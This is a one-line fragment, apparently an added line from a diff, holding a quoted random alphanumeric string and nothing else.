+"57k8RqBX3sGoA97S1SYQJCbdrkNuR
